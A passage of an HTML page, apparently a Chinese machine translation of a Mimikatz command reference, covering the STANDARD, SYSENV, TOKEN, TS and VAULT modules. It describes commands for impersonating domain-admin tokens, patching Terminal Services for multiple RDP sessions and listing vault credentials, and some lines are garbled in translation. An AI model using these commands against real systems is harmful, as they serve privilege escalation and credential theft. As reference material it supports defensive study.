-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Sleep.png" alt="img"></p>
-<p><strong>STANDARD::Version</strong> - 显示版本信息</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Version.png" alt="img"></p>
-<h4 id="SYSENV"><a href="#SYSENV" class="headerlink" title="SYSENV"></a><strong>SYSENV</strong></h4><p>Mimikatz SYSENV模块提供管理系统环境变量的功能。</p>
-<p><strong>SYSENV ::列出SYSENV ::获取SYSENV ::设置SYSENV::Del</strong></p>
-<h4 id="TOKEN"><a href="#TOKEN" class="headerlink" title="TOKEN"></a><strong>TOKEN</strong></h4><p>Mimikatz Token模块使Mimikatz能够与Windows身份验证令牌进行交互，包括抓取和模拟现有令牌。</p>
-<p><strong>TOKEN::Elevate</strong> - 模拟令牌。用于将权限提升为SYSTEM（默认）或使用Windows API在框中查找域管理员令牌。<br><em>需要管理员权限。</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png" alt="Mimikatz令牌，Elevate1"></a></p>
-<p>在框中找到域管理员凭据并使用该令牌：<em>token::elevate / domainadmin</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" alt="Mimikatz令牌 - 提升 -  DomainAdmin"></a></p>
-<p><strong>TOKEN::List</strong> - 列出系统的所有令牌</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png" alt="Mimikatz令牌名录"></a></p>
-<p><strong>TOKEN::Revert</strong> - 恢复为进程令牌</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png" alt="Mimikatz-令牌WHOAMI"></a></p>
-<p><strong>TOKEN::Run</strong>  - Run</p>
-<p><strong>TOKEN::Whoami</strong> - 显示当前身份</p>
-<h4 id="TS"><a href="#TS" class="headerlink" title="TS"></a><strong>TS</strong></h4><p><strong>TS::MultiRDP</strong> - （实验性）补丁终端服务器服务允许多个用户</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png" alt="Mimikatz-TS-MultiRDP"></a></p>
-<p><strong>TS::Sessions</strong>  - 列出TS / RDP会话。</p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png" alt="img"></p>
-<p><strong>TS ::远程</strong> </p>
-<h4 id="VAULT"><a href="#VAULT" class="headerlink" title="VAULT"></a><strong>VAULT</strong></h4><p><strong>VAULT::List</strong> - 列出保险库凭证</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png" alt="Mimikatz保管箱名录"></a></p>
-<p><strong>VAULT::Cred</strong> - cred</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
 
     </footer>
   </div>
